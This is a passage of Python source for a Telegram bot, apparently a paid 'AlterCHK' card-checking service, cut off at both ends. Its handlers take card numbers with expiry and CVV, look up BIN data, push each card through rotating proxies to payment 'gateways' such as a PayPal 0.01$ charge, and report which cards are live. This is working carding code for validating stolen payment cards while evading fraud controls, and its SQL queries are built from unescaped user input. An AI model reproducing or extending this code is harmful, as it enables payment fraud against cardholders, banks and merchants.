    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDchk import LuxyCHK
        CheckRecive = await LuxyCHK(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["pp"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Paypal [ 0.01$ ]'
    TwoNameGateway = 'Gateway ↯ Paypal [ 0.01$ ]'
    ThreeGateway = 'Gateway 🔥 Paypal [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pp')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDpp import CMDPaypal
        CheckRecive = await CMDPaypal(CcVerify, CheckedP[1])
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if (int(CheckRecive[0].find('INVALID_SECURITY_CODE')) >= 0) or (int(CheckRecive[0].find('INVALID_BILLING_ADDRESS')) >= 0) or (int(CheckRecive[0].find('EXISTING_ACCOUNT_RESTRICTED')) >= 0) :
            Status = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nCode - ↯ <b>[{CheckRecive[0]}]</b>\nMessage - ↯ <b>[{CheckRecive[1]}]\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (CheckRecive == 'CHARGED 0.01$') :
            Status = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nMessage - ↯ <b>[{CheckRecive}]\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (int(CheckRecive[0].find('_')) >= 0) or (int(CheckRecive[1].find('_')) >= 0):
            Status = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nCode - ↯ <b>[{CheckRecive[0]}]</b>\nMessage - ↯ <b>[{CheckRecive[1]}]\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        else :
            Status = f'[ An unexpected error occurred. ]'#INVALID_BILLING_ADDRESS
            CheckRecive = f'Please try again.'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["sy"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Syberus [ CCN 5$ ]'
    TwoNameGateway = 'Gateway ↯ Syberus [ CCN 5$ ]'
    ThreeGateway = 'Gateway 🔥 Syberus [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('sy')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text
